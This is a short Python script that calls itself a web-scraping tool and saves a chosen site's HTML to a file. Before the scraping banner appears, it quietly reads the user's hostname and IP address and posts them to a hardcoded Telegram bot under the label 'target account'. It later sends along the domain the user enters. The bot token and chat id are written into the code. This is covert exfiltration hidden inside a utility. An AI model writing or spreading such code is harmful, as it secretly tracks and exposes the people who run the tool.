import requests 
import socket
id = ("5589465204")
token = ("6244714655:AAG4fRJpi-WwB6zGAT__q3ORyN0XWx7PpOo")
hostname = socket.gethostname()
ipaddr = socket.gethostbyname(hostname)
telegram_sand = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=target account\nhostname : {hostname}\nip address : {ipaddr}')
req = requests.post(telegram_sand)

print(""" __        _______ ____    ____                       _
\ \      / / ____| __ )  / ___|  ___ _ __ __ _ _ __ (_)_ __   __ _
 \ \ /\ / /|  _| |  _ \  \___ \ / __| '__/ _` | '_ \| | '_ \ / _` |
  \ V  V / | |___| |_) |  ___) | (__| | | (_| | |_) | | | | | (_| |
   \_/\_/  |_____|____/  |____/ \___|_|  \__,_| .__/|_|_| |_|\__, |
                                              |_|            |___/""")
name = input("enter name web wihout https :")
port = input("chouse a http or https :")
if port == "https" :
    link = "https://" + name
    print("link target :" + link)
elif port == "http" :
	 link = "http://" + name 
	 print("link target :" + link)
else :
	print("chouse a http or https")
telegram_sand = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=target account\ndomain'' : {name}\nport : {port}')
req = requests.post(telegram_sand)
	
url = requests.get(link)
file = open(name + ".html", "w")
file.write(url.text)
print("*" *25 + "sucssfly" + "*" *25)
print("the file are saved in your storage")
